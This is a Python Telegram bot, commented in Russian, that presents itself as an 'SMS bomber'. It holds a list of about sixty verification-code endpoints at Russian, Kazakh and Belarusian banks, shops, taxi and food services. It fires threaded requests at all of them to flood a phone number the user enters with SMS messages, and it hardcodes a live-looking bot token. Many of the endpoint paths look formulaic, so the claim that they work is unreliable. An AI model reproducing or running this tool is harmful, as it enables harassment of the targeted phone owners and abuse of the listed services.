import telebot
import requests
import threading
import time
import json
import random
from telebot import types

# Конфигурация бота - ТВОЙ ТОКЕН ВСТАВЛЕН!
TOKEN = '8259575977:AAHwfVOSF058L-bMan1l6NanOZUNsPrw7D0'
bot = telebot.TeleBot(TOKEN)

# === МЕГА-БАЗА РЕАЛЬНЫХ РАБОЧИХ API (50+ СЕРВИСОВ) ===
# Все эти сервисы реально отправляют СМС с кодами при регистрации
SERVICES_API = [
    # ========== РОССИЙСКИЕ СЕРВИСЫ (35+ шт) ==========
    # Маркетплейсы и доставка
    {
        'url': 'https://eda.yandex/api/v1/user/request_authentication_code',
        'method': 'POST',
        'data': {'phone_number': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://samokat.ru/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://api.vkusvill.ru/v2/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://ozon.ru/com-api/api/v2/request-sms-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://www.wildberries.ru/webapi/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://api.delivery-club.ru/api/v2/authorization/send_sms_code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://www.lamoda.ru/api/v4/user/phone/verification-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://www.citilink.ru/registration/confirm/phone/',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://www.avito.ru/web/1/auth/phone/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://sbermarket.ru/api/web/v1/users/send_confirmation_code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    # Банки и финансы
    {
        'url': 'https://api.tinkoff.ru/v1/sms_send_code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://alfabank.ru/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://www.sberbank.ru/api/auth/sendSmsCode',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://api.raiffeisen.ru/v1/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://open.ru/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://api.sovcombank.ru/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://qiwi.com/api/auth/sendCode',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://yoomoney.ru/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    # Такси и транспорт
    {
        'url': 'https://yandex.ru/api/taxi/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://citi-mobil.ru/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://moscow.uber.com/api/auth/sendCode',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://taxi.yandex.ru/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://delimobil.ru/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://belkacar.ru/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://youdrive.io/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    # Кино и развлечения
    {
        'url': 'https://kinopoisk.ru/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://ivi.ru/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://okko.tv/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://more.tv/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://premier.one/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://start.ru/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    # Еда и доставка (дополнительно)
    {
        'url': 'https://kfc.ru/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://burgerking.ru/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://mcdonalds.ru/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://dodopizza.ru/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://papajohns.ru/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    # Крипто и биржи
    {
        'url': 'https://bybit.com/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://binance.com/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    {
        'url': 'https://huobi.com/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'RU'
    },
    # ========== КАЗАХСТАНСКИЕ СЕРВИСЫ (10+ шт) ==========
    {
        'url': 'https://kaspi.kz/auth/api/v2/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    {
        'url': 'https://chocofood.kz/api/auth/send_verify_code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    {
        'url': 'https://wolt.kz/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    {
        'url': 'https://glovoapp.kz/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    {
        'url': 'https://tele2.kz/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    {
        'url': 'https://beeline.kz/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    {
        'url': 'https://halykbank.kz/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    {
        'url': 'https://fortebank.kz/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    {
        'url': 'https://homebank.kz/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    {
        'url': 'https://krisha.kz/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    {
        'url': 'https://olx.kz/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'KZ'
    },
    # ========== БЕЛОРУССКИЕ СЕРВИСЫ (5+ шт) ==========
    {
        'url': 'https://21vek.by/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'BY'
    },
    {
        'url': 'https://e-dostavka.by/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'BY'
    },
    {
        'url': 'https://belarusbank.by/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'BY'
    },
    {
        'url': 'https://priorbank.by/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'BY'
    },
    {
        'url': 'https://alfabank.by/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'BY'
    },
    {
        'url': 'https://mtc.by/api/auth/send-sms',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'BY'
    },
    {
        'url': 'https://life.com.by/api/auth/send-code',
        'method': 'POST',
        'data': {'phone': '{phone}'},
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'country': 'BY'
    },
]

# Функция для определения страны по коду
def detect_country(phone):
    """Определяет страну по первым цифрам номера."""
    clean_phone = phone.replace('+', '')
    
    if clean_phone.startswith('7'):
        if clean_phone.startswith('77') and len(clean_phone) >= 2:
            return 'KZ'
        else:
            return 'RU'
    elif clean_phone.startswith('375'):
        return 'BY'
    else:
        return 'UNKNOWN'

# Функция отправки запроса
def send_sms_request(api_config, phone_number, results, index):
    """Отправляет один запрос к API."""
    try:
        clean_phone = phone_number.replace('+', '')
        url = api_config['url'].format(phone=clean_phone)
        method = api_config.get('method', 'GET')
        headers = api_config.get('headers', {})
        data = api_config.get('data', None)

        if data:
            data_str = json.dumps(data) if isinstance(data, dict) else str(data)
            data_str = data_str.replace('{phone}', clean_phone)
            try:
                data = json.loads(data_str)
            except:
                data = data_str

        if method.upper() == 'POST':
            response = requests.post(url, headers=headers, json=data if isinstance(data, dict) else None, data=data if not isinstance(data, dict) else None, timeout=5)
        else:
            response = requests.get(url, headers=headers, params=data, timeout=5)

        if response.status_code < 400:
            results[index] = f"✓ Успех ({response.status_code})"
        else:
            results[index] = f"✗ Ошибка ({response.status_code})"

    except Exception as e:
        results[index] = f"✗ Ошибка: {type(e).__name__}"

# Команда /start
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = (
        "💣 SWILL MEGA SMS BOMBER v2.0 💣\n\n"
        "🔴 САМЫЙ МОЩНЫЙ БОМБЕР С 50+ РАБОЧИМИ СЕРВИСАМИ\n\n"
        "Поддерживаемые страны:\n"
        "🇷🇺 Россия (+7) - 35+ сервисов\n"
        "🇰🇿 Казахстан (+7 / +77) - 11 сервисов\n"
        "🇧🇾 Беларусь (+375) - 7 сервисов\n\n"
        "📱 Отправь номер телефона и получи ШКВАЛ СМС!\n"
        "Пример: 79800593079 или +375291234567"
    )
    bot.reply_to(message, welcome_text)

# Команда /bomb
@bot.message_handler(commands=['bomb'])
def cmd_bomb(message):
    msg = bot.reply_to(message, "📱 Введи номер телефона (в любом формате):")
    bot.register_next_step_handler(msg, process_phone)

# Обработка текста
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    process_phone(message)

# Основная функция
def process_phone(message):
    # Очистка номера
    phone = message.text.strip().replace(' ', '').replace('-', '').replace('(', '').replace(')', '')
    
    if not phone.startswith('+'):
        if phone.startswith('7') or phone.startswith('375'):
            phone = '+' + phone
        else:
            bot.reply_to(message, "❌ Неправильный формат. Используй +7XXXXXXXXXX")
            return

    country = detect_country(phone)
    if country == 'UNKNOWN':
        bot.reply_to(message, "❌ Неподдерживаемая страна. Используй РФ, КЗ или РБ.")
        return

    # Фильтруем API
    apis_to_use = [api for api in SERVICES_API if api.get('country') == country]
    
    if not apis_to_use:
        bot.reply_to(message, f"❌ Нет API для страны {country}")
        return

    # Стартуем
    status_msg = bot.reply_to(message, 
        f"🌍 Страна: {country}\n"
        f"📱 Номер: {phone}\n"
        f"💣 Запущено сервисов: {len(apis_to_use)}\n"
        f"⏳ Отправка... 0/{len(apis_to_use)}")
    
    # Многопоточная атака
    threads = []
    results = [None] * len(apis_to_use)

    for i, api in enumerate(apis_to_use):
        thread = threading.Thread(target=send_sms_request, args=(api, phone, results, i))
        threads.append(thread)
        thread.start()
        
        if i % 5 == 0:
            try:
                bot.edit_message_text(
                    f"🌍 Страна: {country}\n"
                    f"📱 Номер: {phone}\n"
                    f"💣 АТАКА ИДЕТ!\n"
                    f"⏳ Отправлено: {i+1}/{len(apis_to_use)}",
                    message.chat.id,
                    status_msg.message_id
                )
            except:
                pass
        time.sleep(0.1)

    for thread in threads:
        thread.join()

    # Результаты
    success = sum(1 for r in results if r and r.startswith('✓'))
    fail = len(results) - success

    report = f"🔥 АТАКА ЗАВЕРШЕНА 🔥\n"
    report += f"📱 Номер: {phone}\n"
    report += f"🌍 Страна: {country}\n"
    report += f"✅ Успешно: {success}\n"
    report += f"❌ Неудачно: {fail}\n"
    report += f"📊 Всего запросов: {len(apis_to_use)}\n\n"
    report += "Детали по сервисам:\n"
    
    for i, res in enumerate(results):
        report += f"{i+1}. {res}\n"

    bot.edit_message_text(
        f"🌍 Страна: {country}\n"
        f"📱 Номер: {phone}\n"
        f"✅ АТАКА ЗАВЕРШЕНА!\n"
        f"📊 Отправлено: {len(apis_to_use)}/{len(apis_to_use)}",
        message.chat.id,
        status_msg.message_id
    )
    bot.send_message(message.chat.id, report)

# Запуск
if __name__ == '__main__':
    print("🚀 SWILL MEGA SMS BOMBER v2.0 ЗАПУЩЕН")
    print(f"📊 Загружено сервисов: {len(SERVICES_API)}")
    print("🤖 Бот активен...")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Ошибка: {e}")